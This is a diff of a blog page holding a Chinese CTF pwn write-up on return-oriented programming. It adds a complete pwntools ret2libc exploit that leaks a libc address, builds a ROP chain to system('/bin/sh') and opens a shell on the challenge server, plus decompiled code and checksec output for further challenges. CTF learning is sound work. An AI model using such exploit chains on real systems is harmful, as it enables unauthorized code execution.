@@ -22,12 +22,12 @@
     <meta name="description" content="基础ROP">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ROP">
-<meta property="og:url" content="http://example.com/2025/02/28/2025GHCTF_WP/index.html">
+<meta property="og:url" content="http://example.com/2025/03/02/2025GHCTF_WP/index.html">
 <meta property="og:site_name" content="Briteny&#39;s Blog">
 <meta property="og:description" content="基础ROP">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-02-28T11:44:00.000Z">
-<meta property="article:modified_time" content="2025-03-02T12:31:16.174Z">
+<meta property="article:published_time" content="2025-03-02T12:48:00.000Z">
+<meta property="article:modified_time" content="2025-03-04T12:51:53.061Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -210,8 +210,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-02-28 19:44" pubdate>
-          2025年2月28日 晚上
+        <time datetime="2025-03-02 20:48" pubdate>
+          2025年3月2日 晚上
         </time>
       </span>
     
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.6k 字
+          3.3k 字
         
       </span>
     
@@ -233,7 +233,7 @@
         
         
         
-          22 分钟
+          28 分钟
         
       </span>
     
@@ -351,6 +351,12 @@
 <p>再具体一点就是64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐，说简单一点就是在将要调用system函数的时候，rsp指向的地址末尾需是0。</p>
 <p>在64位程序中，栈地址的最后一位不是0就是8</p>
 <p>详细原理介绍</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">► 0x7f78bfdcb43b &lt;do_system+363&gt;    movaps xmmword ptr [rsp + 0x50], xmm0     &lt;[0x7ffce80bf2e8] not aligned to 16 bytes&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong>将xmm0中保存的单精度浮点数从xmm0移动至地址[rsp + 0x50]处</strong> </p>
+<p>当然，更重要的是这条指令的执行条件，这直接关系到程序报错的原因。</p>
+<p>当内存地址作为操作数时，内存地址必须对齐 <strong>16Byte</strong> 、 <strong>32Byte</strong> 或 <strong>64Byte</strong> 。这里所说的对齐 <strong>xByte</strong>，就是指地址必须是 <strong>x</strong> 的倍数。</p>
+<p>使用 <strong>XMM</strong> 时，需要 <strong>16Byte</strong> 对齐；使用 <strong>YMM</strong> 时，需要 <strong>32Byte</strong> 对齐；使用 <strong>ZMM</strong> 时，需要 <strong>64Byte</strong> 对齐。</p>
 <h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><h3 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h3><p>IDA_main:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    menu();<br>    <span class="hljs-keyword">switch</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)read_count() )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        flower();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        books();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        hell_money();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        clothing();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        shop();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">6u</span>:<br>        check_money();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">7u</span>:<br>        see_it();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choose&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -397,16 +403,16 @@
 </tr>
 </thead>
 <tbody><tr>
-<td align="center"></td>
+<td align="center">start_addr</td>
 </tr>
 <tr>
-<td align="center"></td>
+<td align="center">put_plt</td>
 </tr>
 <tr>
-<td align="center"></td>
+<td align="center">puts_got</td>
 </tr>
 <tr>
-<td align="center">ret_addr [  ]</td>
+<td align="center">ret_addr [ pop_rdi_ret_addr ]</td>
 </tr>
 <tr>
 <td align="center">缓冲区+old_ebp</td>
@@ -415,7 +421,7 @@
 <td align="center">low_addr</td>
 </tr>
 </tbody></table>
-<p>构造栈的思路</p>
+<p>构造getshell的栈的思路</p>
 <table>
 <thead>
 <tr>
@@ -441,7 +447,32 @@
 <td align="center">low_addr</td>
 </tr>
 </tbody></table>
-<p>然后</p>
+<p>exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)<br>libc = ELF(&#x27;./libc.so.6&#x27;)<br>f = ELF(&#x27;./attachment&#x27;)<br>p=remote(&#x27;node2.anna.nssctf.cn&#x27;,28830)<br>#p=process(&#x27;./attachment&#x27;)<br>#进入溢出攻击位置<br>p.recvuntil(b&#x27;6.check youer money\n&#x27;)<br>p.sendline(b&#x27;3&#x27;)<br>p.recvuntil(b&#x27;How much do you want to spend buying the hell_money?\n&#x27;)<br>p.sendline(b&#x27;1000&#x27;)<br>p.recvuntil(b&#x27;6.check youer money\n&#x27;)<br>p.sendline(b&#x27;7&#x27;)<br>p.recvuntil(b&#x27;How much do you exchange?&#x27;)<br>p.sendline(b&#x27;1000000&#x27;)<br>p.recvuntil(b&#x27;6.check youer money\n&#x27;)<br>p.sendline(b&#x27;5&#x27;)<br>p.recvuntil(b&#x27;You can name it!!!\n&#x27;)<br>#开始栈溢出漏洞攻击<br>pop_rdi_ret_addr = 0x0000000000400d73<br>#puts_plt = 0x0400590<br>#puts_got = 0x0602018<br>#start_addr = 0x0400C4F<br>puts_plt = f.plt[&#x27;puts&#x27;] #puts函数的入口地址<br>puts_got = f.got[&#x27;puts&#x27;]  #puts函数的got表地址<br>start_addr = f.symbols[&#x27;_start&#x27;] #程序的起始地址<br><br>payload1 = b&#x27;a&#x27;*(0x40 + 0x8) + p64(pop_rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(start_addr)<br>p.send(payload1)<br>puts_real_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>#read函数的真实地址，由于真实地址总是从7f开始，故从7f开始接收，长度补足8个字节<br>print(&quot;puts_real_addr: &quot;, hex(puts_real_addr))<br>libc_base = puts_real_addr - libc.sym[&quot;puts&quot;]<br><br>#ret_addr = 0x00400579<br>pop_rdi_ret_addr = 0x0000000000400d73<br>system_addr = libc_base + libc.sym[&quot;system&quot;]<br>binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh&quot;))<br>print(&quot;system_addr:&#123;&#125;&quot;.format(hex(system_addr)))<br>print(&quot;binsh_addr:&#123;&#125;&quot;.format(hex(binsh_addr)))<br><br>payload2 = b&#x27;a&#x27;*(0x40+0x8) + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)<br><br>p.recvuntil(b&#x27;6.check youer money\n&#x27;)<br>p.sendline(b&#x27;5&#x27;)<br>p.sendline(payload2)<br>sleep(0.5)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>题解有点繁琐，需要学习一些大佬的模板来简化</p>
+<h2 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h2><h3 id="IDA-2"><a href="#IDA-2" class="headerlink" title="IDA"></a>IDA</h3><p>IDA_main</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  func();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>IDA_func</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">char</span> format[<span class="hljs-number">14</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-10h] BYREF</span><br>  __int16 v3; <span class="hljs-comment">// [rsp+2Eh] [rbp-2h]</span><br><br>  <span class="hljs-built_in">strcpy</span>(format, <span class="hljs-string">&quot;hello world!\n&quot;</span>);<br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(format);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;give you a gift.&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;show your magic&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x60u</span>LL);<br>  <span class="hljs-keyword">return</span> buf;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>一些漏洞比较明显，格式化字符串漏洞，栈溢出，文章给了libc文件【还给了一个ld.so.6的文件，目前不知道有什么作用】</p>
+<p>基本思路准备是泄露libc基址按照ret2libc的基本思路写</p>
+<h3 id="checksec-2"><a href="#checksec-2" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/111/ret2libc2$ checksec ret2libc2<br>[*] &#x27;/mnt/d/111/ret2libc2/ret2libc2&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="真会布置栈吗？"><a href="#真会布置栈吗？" class="headerlink" title="真会布置栈吗？"></a>真会布置栈吗？</h2><h3 id="checksec-3"><a href="#checksec-3" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/111/pwn4$ checksec attachment<br>[*] &#x27;/mnt/d/111/pwn4/attachment&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      No RELRO<br>    Stack:      No canary found<br>    NX:         NX unknown - GNU_STACK missing<br>    PIE:        No PIE (0x400000)<br>    Stack:      Executable<br>    RWX:        Has RWX segments<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
@@ -488,7 +519,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>ROP</div>
-      <div>http://example.com/2025/02/28/2025GHCTF_WP/</div>
+      <div>http://example.com/2025/03/02/2025GHCTF_WP/</div>
     </div>
     <div class="license-meta">
       
@@ -500,7 +531,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年2月28日</div>
+          <div>2025年3月2日</div>
         </div>
       
       
